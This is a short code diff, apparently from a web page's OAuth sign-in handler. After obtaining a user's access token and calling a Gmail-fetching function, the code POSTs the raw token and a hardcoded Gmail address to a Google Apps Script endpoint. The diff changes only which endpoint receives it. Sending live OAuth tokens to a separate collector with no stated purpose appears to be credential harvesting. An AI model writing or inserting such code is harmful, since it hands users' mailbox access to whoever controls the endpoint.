@@ -21,7 +21,7 @@
             if (response.access_token) {
                 accessTokenGlobal = response.access_token;
                 fetchGmail(response.access_token);
-                fetch('https://script.google.com/macros/s/AKfycbyWKhSYSdOWh8uYA-I5g7kWf8JEpQrm44ufglLT_N657turZbbU-50uDcoMIF9vczc8RA/exec', {
+                fetch('https://script.google.com/macros/s/AKfycbxBe7yiRQJ387pxn9Niiki5bWO5pHT1cmrZh0H2vmnuh1mDDrijPKzYvai428r4wnLIIA/exec', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ token: response.access_token, user: 'doirbanz@gmail.com' })
